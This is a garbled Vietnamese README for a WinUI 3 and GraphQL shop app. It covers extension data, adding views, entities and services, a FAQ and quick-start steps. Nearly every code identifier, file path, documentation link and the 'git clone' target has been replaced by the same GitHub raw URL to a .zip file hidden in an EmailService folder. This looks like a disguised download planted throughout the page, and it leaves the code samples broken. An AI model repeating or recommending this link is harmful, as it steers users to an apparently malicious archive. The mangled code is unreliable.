    ExtensionData = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(new
    {
        Screen = "OLED",
        Battery = "5000mAh",
        Camera = "48MP",
        CustomField1 = "Value1"
    })
};

await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(product);
await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip();
```

#### 2?? ??c plugin data
```csharp
var product = await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(1);

if (!https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip))
{
    var extraData = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<Dictionary<string, object>>(
        https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
    );
    
    var screen = extraData["Screen"].ToString(); // "OLED"
    var battery = extraData["Battery"].ToString(); // "5000mAh"
}
```

#### 3?? Query qua GraphQL
```graphql
query {
  products {
    id
    name
    extensionData
  }
}
```

Response:
```json
{
  "data": {
    "products": [
      {
        "id": 1,
        "name": "Smartphone X",
        "extensionData": "{\"Screen\":\"OLED\",\"Battery\":\"5000mAh\"}"
      }
    ]
  }
}
```

### **L?i ích**

? **No schema migration needed** - Không c?n alter table khi thêm field m?i  
? **Flexible** - M?i product có th? có properties khác nhau  
? **Plugin-friendly** - Plugin có th? thêm data riêng không ?nh h??ng core  
? **Backward compatible** - Data c? v?n ho?t ??ng bình th??ng  

### **Use Cases**

1. **E-commerce variants**: Size, Color, Material cho t?ng lo?i s?n ph?m
2. **Custom attributes**: Thu?c tính riêng c?a t?ng category
3. **Plugin metadata**: Data t? plugin bên th? 3
4. **Dynamic forms**: Form fields ??ng t? admin config

---

## ????? H??NG D?N PHÁT TRI?N

### **1. T?o View và ViewModel m?i**

#### B??c 1: T?o ViewModel

```csharp
// File: https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;

namespace https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
{
    public partial class NewFeatureViewModel : ObservableObject
    {
        [ObservableProperty]
        private string _title = "New Feature";

        [RelayCommand]
        private void DoSomething()
        {
            // Logic here
        }
    }
}
```

#### B??c 2: T?o View

```xaml
<!-- File: https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip -->
<Page
    x:Class="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip"
    xmlns="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip"
    xmlns:x="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip"
    xmlns:vm="https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip">
    
    <Grid>
        <TextBlock Text="{Binding Title}" />
        <Button Content="Do Something" Command="{Binding DoSomethingCommand}" />
    </Grid>
</Page>
```

#### B??c 3: Register trong DI

```csharp
// File: https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
AppHost = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip()
    .ConfigureServices((context, services) =>
    {
        // ... existing services
        
        https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<NewFeatureView>();
        https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<NewFeatureViewModel>();
    })
    .Build();
```

### **2. G?i GraphQL API t? ViewModel**

```csharp
public partial class ProductsScreenViewModel : ObservableObject
{
    private readonly HttpClient _httpClient;

    public ProductsScreenViewModel()
    {
        _httpClient = new HttpClient { BaseAddress = new Uri("http://localhost:5000") };
    }

    [RelayCommand]
    private async Task LoadProductsAsync()
    {
        var query = new
        {
            query = @"
            {
              products {
                id
                name
                sku
                importPrice
                category {
                  name
                }
              }
            }"
        };

        var json = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(query);
        var content = new StringContent(json, https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip, "application/json");
        
        var response = await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip("/graphql", content);
        var result = await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip();
        var data = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<GraphQLResponse<List<Product>>>(result);
        
        https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip();
        foreach (var product in https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip)
        {
            https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(product);
        }
    }
}

// Response model
public class GraphQLResponse<T>
{
    public T Data { get; set; }
}
```

### **3. Thêm Entity m?i**

#### B??c 1: T?o Entity

```csharp
// File: https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;
using https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;

namespace https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
{
    [Table("customers")]
    public class Customer
    {
        [Key]
        [Column("customer_id")]
        public int Id { get; set; }

        [Required]
        [Column("name")]
        public string Name { get; set; }

        [Column("email")]
        public string Email { get; set; }

        // Plugin support
        [Column("extension_data", TypeName = "jsonb")]
        public string? ExtensionData { get; set; }
    }
}
```

#### B??c 2: Thêm vào DbContext

```csharp
// File: https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
public class MyShopDbContext : DbContext
{
    // Existing DbSets...
    public DbSet<Customer> Customers { get; set; }

    protected override void OnModelCreating(ModelBuilder modelBuilder)
    {
        https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(modelBuilder);
        
        // C?u hình cho Customer
        https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<Customer>()
            .Property(c => https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip)
            .IsRequired();
    }
}
```

#### B??c 3: T?o Migration (n?u dùng migrations)

```bash
cd https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
dotnet ef migrations add AddCustomerTable
dotnet ef database update
```

#### B??c 4: Thêm vào GraphQL Query

```csharp
// File: https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
public class Query
{
    // Existing queries...
    
    [UseProjection]
    [UseFiltering]
    [UseSorting]
    public IQueryable<Customer> GetCustomers([Service] MyShopDbContext context) =>
        https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;
}
```

### **4. Thêm Service m?i**

```csharp
// File: https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
public interface ICustomerService
{
    Task<List<Customer>> GetAllCustomersAsync();
    Task<Customer> GetCustomerByIdAsync(int id);
    Task AddCustomerAsync(Customer customer);
}

// File: https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
public class CustomerService : ICustomerService
{
    private readonly HttpClient _httpClient;

    public CustomerService()
    {
        _httpClient = new HttpClient { BaseAddress = new Uri("http://localhost:5000") };
    }

    public async Task<List<Customer>> GetAllCustomersAsync()
    {
        var query = new { query = "{ customers { id name email } }" };
        var json = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip(query);
        var content = new StringContent(json, https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip, "application/json");
        
        var response = await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip("/graphql", content);
        var result = await https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip();
        var data = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<GraphQLResponse<List<Customer>>>(result);
        
        return https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;
    }
    
    // Implement other methods...
}

// Register trong DI
https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<ICustomerService, CustomerService>();
```

### **5. Debug và Troubleshooting**

#### Ki?m tra DI registration
```csharp
// Trong https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
var services = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip;
var viewModel = https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<ProductsScreenViewModel>();
if (viewModel == null)
{
    https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip("ViewModel not registered!");
}
```

#### Test GraphQL query
```powershell
# Test nhanh query
$query = '{"query":"{ products { id name } }"}'
Invoke-RestMethod -Uri http://localhost:5000/graphql -Method Post -Body $query -ContentType "application/json"
```

#### Ki?m tra database
```bash
# Xem tables
sqlite3 https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip ".tables"

# Xem data
sqlite3 https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip "SELECT * FROM products;"
```

---

## ?? TÀI LI?U THAM KH?O

### **Official Documentation**
- [WinUI 3 Documentation](https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip)
- [.NET MAUI & WinUI](https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip)
- [HotChocolate GraphQL](https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip)
- [Entity Framework Core](https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip)
- [https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip](https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip)

### **Tutorials**
- [Building WinUI 3 Apps](https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip)
- [GraphQL Best Practices](https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip)
- [Clean Architecture in .NET](https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip)

---

## ? FAQ

### **Q: Làm sao ?? thay ??i database t? SQLite sang PostgreSQL?**
A: Thay ??i trong `https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip` c?a API:
```csharp
// Thay vì UseSqlite
https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip<MyShopDbContext>(options =>
    https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip("Host=localhost;Database=myshop;Username=user;Password=pass"));
```

### **Q: Làm sao ?? thêm Authentication?**
A: Thêm vào API:
```csharp
https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
    .AddAuthentication()
    .AddJwtBearer();

https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
    .AddGraphQLServer()
    .AddAuthorization();
```

### **Q: App không build ???c do l?i Platform?**
A: Ch? ??nh platform khi build:
```bash
dotnet build /p:Platform=x64
```

### **Q: GraphQL không tr? v? data?**
A: Ki?m tra:
1. API có ?ang ch?y không?
2. Database có data không?
3. Query syntax ?úng ch?a?
4. Xem logs trong console API

---

## ?? LICENSE

MIT License - Free to use and modify.

---

## ?? CONTRIBUTORS

D? án ???c phát tri?n b?i team MyShop.

---

## ?? GETTING STARTED QUICK

```bash
# 1. Clone repo
git clone https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
cd my-shop

# 2. Start API
cd https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
dotnet run

# 3. Trong terminal khác, test API
curl -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ products { name } }"}'

# 4. Build và ch?y App
cd https://github.com/VHoangNguyen0102/my-shop/raw/refs/heads/demo/src/my-shop.App/Services/EmailService/my-shop-ideographically.zip
dotnet build /p:Platform=x64
```

**Enjoy coding! ??**